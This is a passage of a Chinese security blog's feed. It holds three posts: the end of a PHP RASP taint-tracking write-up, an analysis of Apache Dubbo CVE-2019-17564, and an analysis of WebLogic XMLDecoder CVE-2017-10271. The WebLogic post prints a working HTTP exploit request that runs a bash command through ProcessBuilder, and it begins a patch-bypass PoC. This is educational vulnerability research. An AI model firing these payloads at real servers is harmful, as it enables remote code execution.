class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>先判断php版本，7.0.3为分界线，我这里是7.0.33，通过宏定义实现标记、清除、检测flag的功能，其中<code>GC_FLAGS</code>函数为php内核中<code>php-src-php-7.0.33/Zend/zend_types.h</code>的宏定义，借助了垃圾回收结构的<code>gc.u.v.flags</code>字段的未被使用的标记位来记录是否被污染：<br><img src="https://i.loli.net/2020/03/01/EDpUPNlS1teb23A.jpg" alt="-w747"><br>而在清除标记、检测标记的实现中思路也和这个类似，通过<code>xmark/php_xmark.h</code>的宏进行运算。</p><h2 id="威胁判断"><a href="#威胁判断" class="headerlink" title="威胁判断"></a>威胁判断</h2><p>思路是这样的，像<code>phpwaf</code>一样在项目最开始的地方，污点标记HTTP请求中可控的参数，称之为<code>source</code>点标记：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prvd_xmark($_GET, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_POST, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_COOKIE, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_FILES, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_REQUEST, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($key, <span class="string">'HTTP_'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        prvd_xmark($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这些参数经过拼接、赋值等操作不断的传递，我们把他称之为<code>filter</code>点，在这个过程标记也要随之传递，一个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_decode</span><span class="params">($data, ...$args)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func(PRVD_RENAME_PREFIX.<span class="string">"base64_decode"</span>, $data, ...$args);</span><br><span class="line">    <span class="keyword">if</span> (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($data)) &#123;</span><br><span class="line">        prvd_xmark($result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在遇到base64解码操作时，如果<code>source</code>点已被标记，则传递标记给解码后的字符串。</p><p>最后就是威胁判断的过程，这些数据在最后到达敏感函数的<code>sink</code>点，比如<code>system</code>、<code>eval</code>这些高危函数，判断标记是否还存在，即检测是否有可控的风险。</p><h2 id="上报平台"><a href="#上报平台" class="headerlink" title="上报平台"></a>上报平台</h2><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后想了一下payload模式的缺点，在多入口php文件时，容易产生遗漏包含waf的情况，导致误报的问题，当然如果把全部逻辑都写到扩展中，与之而言的代价就是开发难度极高。其次Fuzz模式特殊漏洞检测需要指定的payload，且检测的精度取决于payload的精度。不过我觉得有污点检测功能就够了。</p><p>花了差不多半个月的时间来研究PHP的RASP机制，从php内核到各种开源的rasp项目都有了一个深入的学习。写C语言扩展，研究php底层太硬核了，属实自闭，以后打算再研究一下java的rasp机制。</p><p>最后膜前辈们的探索和分享。</p><p>参考文章：</p><ul><li><a href="https://www.ichenfu.com/2015/03/01/override-php-function/" target="_blank" rel="noopener">替换PHP底层函数实现</a></li><li><a href="https://blog.zsxsoft.com/post/30" target="_blank" rel="noopener">从PHP源码与扩展开发谈PHP任意代码执行与防御</a></li><li><a href="https://www.kancloud.cn/nickbai/php7/363323" target="_blank" rel="noopener">php7内核剖析</a></li><li><a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark: A PHP7 extension that can hook most functions/classes and parts of opcodes</a></li><li><a href="https://paper.seebug.org/449/" target="_blank" rel="noopener">一类PHP RASP实现</a></li><li><a href="http://blog.fatezero.org/2018/11/11/prvd/" target="_blank" rel="noopener">PHP 运行时漏洞检测</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html" target="_blank" rel="noopener">毕业设计之php RASP</a></li><li><a href="https://github.com/laruence/taint/" target="_blank" rel="noopener">taint: Taint is a PHP extension, used for detecting XSS codes</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="PHP" scheme="http://0day.design/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-17564：Apache Dubbo反序列化漏洞分析</title>
    <link href="http://0day.design/2020/02/14/CVE-2019-17564%EF%BC%9AApache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/02/14/CVE-2019-17564：Apache Dubbo反序列化漏洞分析/</id>
    <published>2020-02-14T08:17:00.000Z</published>
    <updated>2020-02-14T08:19:54.399Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>前几天360发了一则<a href="https://cert.360.cn/warning/detail?id=f7a1500f71a6c192974a58167b00715e" target="_blank" rel="noopener">Apache Dubbo的漏洞预警</a>，@hu3sky师傅让我帮他看看这个漏洞复现的问题。Burp打二进制的反序列化数据有一点bug，这里记录一下解决的过程。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-samples.git</span><br><span class="line">cd dubbo-samples/java/dubbo-samples-http</span><br></pre></td></tr></table></figure><p>修改<code>/dubbo-samples/java/dubbo-samples-http/pom.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source.level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">target.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target.level</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--修改版本为2.7.3--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>再加一个dependency，作为gadget：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后 <code>mvn clean package</code><br>接着 <code>mvn -Djava.net.preferIPv4Stack=true -Dexec.mainClass=org.apache.dubbo.samples.http.HttpProvider exec:java</code></p><p>或者扔进idea里，配一个<code>-Djava.net.preferIPv4Stack=true</code>参数<br><img src="https://i.loli.net/2020/02/14/MiAtCTDOJWLaFQk.jpg" alt="-w607"></p><p>还要配一个zookeeper：<br><a href="media/15816499211332/zookeeper-3.4.14.tar.gz">zookeeper-3.4.14.ta</a></p><p>执行<code>bin/zkServer.sh</code>，如果提示<code>no such file zoo.cfg</code>，在<code>conf</code>目录下把<code>zoo-sample.cfg</code>改成<code>zoo.cfg</code>，然后继续执行即可。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>踩了一堆坑，yso生成的反序列化数据，直接贴进burp是有蜜汁bug的，最后的解决办法有两种：</p><ul><li>在Repeat里用Paste from file (@hu3sky师傅成功了，我没成功)<br><img src="https://i.loli.net/2020/02/14/ZDVUbvoFjeN4G9x.jpg" alt="-w485"></li><li>最后翻<a href="https://github.com/snoopysecurity/awesome-burp-extensions/blob/master/README.md" target="_blank" rel="noopener">awesome-burp-extensions</a>找到了<a href="https://github.com/federicodotta/Java-Deserialization-Scanner" target="_blank" rel="noopener">Java-Deserialization-Scanner</a>这个burp插件解决的，安利一波：<br><img src="https://i.loli.net/2020/02/14/ChAkUBnpoy5WSFG.jpg" alt="-w1501"><br><img src="https://i.loli.net/2020/02/14/n4ORovwryFxVT3K.jpg" alt="-w1539"></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在dispatch文件处理http路由分发，/org/apache/dubbo/remoting/http/servlet/DispatcherServlet.java<br><img src="https://i.loli.net/2020/02/14/Y2Pd14HDOksAc3Z.jpg" alt="-w1157"></p><p>跟进<code>handle</code>函数：/org/apache/dubbo/rpc/protocol/http/HttpProtocol.java<br><img src="https://i.loli.net/2020/02/14/PhLxtDC3yM6qXkB.jpg" alt="-w1234"><br>判断是否为post请求，然后继续处理Request：/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.class<br><img src="https://i.loli.net/2020/02/14/cpnAQzj1BfhuUGO.jpg" alt="-w1250"><br>将request的post输入传入：<br><img src="https://i.loli.net/2020/02/14/cwU3EBLyIWRlMNt.jpg" alt="-w1379"></p><p>最后在/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.class， 调用<code>readObject()</code><br><img src="https://i.loli.net/2020/02/14/t73GKlqsYydihA8.jpg" alt="-w1510"></p><p>调用栈：<br><img src="https://i.loli.net/2020/02/14/yNWOjJD1TYSBQbE.jpg" alt="-w679"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>一个sample环境的反序列化，要结合其他组件才能利用，个人感觉危害面不是很大。<br>新版的修复策略，在处理路由的<code>handle</code>函数，使用了另外一个组件，且在处理非json数据的时候会抛出异常。<br><img src="https://i.loli.net/2020/02/14/rkn6JQA9iNPHRLF.jpg" alt="-w1526"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic-XMLDecoder反序列化分析</title>
    <link href="http://0day.design/2020/02/11/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/02/11/WebLogic-XMLDecoder反序列化分析/</id>
    <published>2020-02-11T08:34:00.000Z</published>
    <updated>2020-02-11T08:40:41.192Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>关于java反序列化，可以参考这篇文章，写的很详细深入<a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">@gyyyy《浅析Java序列化和反序列化》</a>。<br>XMLDecoder是java中的一个类，不是Weblogic特有的，在这个位置<code>java.beans.XMLDecoder</code>，个人理解和传统反序列化类似，只是载体是通过XML来描述序列化数据。</p><p>下面来看一个解析xml导致反序列化命令执行的demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        XMLDecoder d = <span class="keyword">new</span> XMLDecoder(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line">                        <span class="keyword">new</span> FileInputStream(<span class="string">"/Users/passer6y/Documents/Code/java/weblogic/test.xml"</span>)));</span><br><span class="line">        Object result = d.readObject();</span><br><span class="line">        d.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/11/x5JpXi8PQlT7O9b.jpg" alt="-w1247"></p><p>运行后可以发现，XML转换过来的java代码即<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder;</span><br><span class="line"><span class="keyword">import</span> java.lang.String;</span><br><span class="line"></span><br><span class="line">String[] cmdList = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"open -a Calculator"</span>&#125;;</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmdList).start();</span><br></pre></td></tr></table></figure></p><p>关于XMLDecoder解析流程可以看这篇文章：<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoder解析流程分析</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub环境：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271</a></p><p>这里需要远程调试，修改配置：docker-compose.yml<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr"> weblogic:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"7001:7001"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure></p><p>执行<code>docker-compose up -d</code>，拉起容器后，进入容器，修改配置：<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>，添加debug配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/11/m6zridWtV9X7bjs.jpg" alt="-w871"></p><p>重启容器，再进入容器查看端口：<br><img src="https://i.loli.net/2020/02/11/vat7pcej1sOxTzq.jpg" alt="-w763"></p><p>拷贝源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp 0e1ef58d4a70:/root/Oracle/Middleware/wlserver_10.3 ./</span><br><span class="line">docker cp 0e1ef58d4a70:/root/Oracle/Middleware/modules ./</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/11/YLUHXGBjMbNqa3V.jpg" alt="-w1319"></p><p><img src="https://i.loli.net/2020/02/11/V84lhJW7HErmAdI.jpg" alt="-w1496"></p><p>折腾好之后，下好断点，浏览器触发请求，结果巨慢，加载了很久。</p><p>索性在本地装一个，官网下载安装的jar包，使用这个命令安装<code>java -Dspace.detection=false -jar wls1036_generic.jar</code>(不加<code>-Dspace.detection=false</code>参数会爆空间不足)</p><p>安装过程教程：<a href="https://blog.csdn.net/weixin_40102675/article/details/88180647" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40102675/article/details/88180647</a></p><p>装好后启动weblogic<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Oracle/Middleware/user_projects/domains/base_domain/bin</span><br><span class="line">./startWeblogic.sh</span><br></pre></td></tr></table></figure></p><p>去<a href="http://127.0.0.1:7001/console，输入密码weblogic" target="_blank" rel="noopener">http://127.0.0.1:7001/console，输入密码weblogic</a> weblogic@123<br><img src="https://i.loli.net/2020/02/11/nldr4HTe6QJtIiR.jpg" alt="-w762"></p><p>其他debug配置和上述一样。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.95 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSID=mgr2tl959j6r7qbi9dadh0tsv5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 599</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;open -a Calculator&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/11/fEFXP3oiRj2GBKs.jpg" alt="-w1288"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从poc的路由来看，wls-wsat这个接口出了问题，找到该war包的web.xml配置，定位到其对应的Servlet：weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl<br><img src="https://i.loli.net/2020/02/11/dbkgYsy2Uzlq9Fe.jpg" alt="-w1538"></p><p>这个即为漏洞作用的接口，先从exp的响应包返回的调用栈来跟一下processRequest：<br><img src="https://i.loli.net/2020/02/11/v2r8gGyTHs9tFld.jpg" alt="-w1061"></p><p>weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest<br><img src="https://i.loli.net/2020/02/11/4HUcO9WlkEIqtnh.jpg" alt="-w1393"><br>var1即我们传入的XML，var3为soap标签解析结果，跟进weblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOld<br><img src="https://i.loli.net/2020/02/11/vKM8ES9dILx4cJO.jpg" alt="-w1407"><br>var4为poc关键部分，跟进receive函数，/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#receive<br><img src="https://i.loli.net/2020/02/11/VxYt4Ky1d7OceUb.jpg" alt="-w1196"></p><p>一直往下跟：<br>-&gt; /weblogic/workarea/WorkContextLocalMap.class#receiveRequest<br>-&gt; /weblogic/workarea/spi/WorkContextEntryImpl.class#readEntry<br>-&gt; /weblogic/wsee/workarea/WorkContextXmlInputAdapter.class#readUTF<br><img src="https://i.loli.net/2020/02/11/RoLM3k5EbTvV1lB.jpg" alt="-w867"><br>调用了xmlDecoder的<code>readObject</code>函数进行反序列化操作，最终造成命令执行。</p><p>调用栈：<br><img src="https://i.loli.net/2020/02/11/pjZ3oSYe8u2cFTl.jpg" alt="-w533"></p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>weblogic补丁只给付费用户发，我也就只能康康别人文章里的补丁来分析了。</p><p>这里补丁在<code>WorkContextXmlInputAdapter</code>中添加了<code>validate</code>验证，限制了Object标签，从而限制通过XML来构造类。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>这个版本对应的poc:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 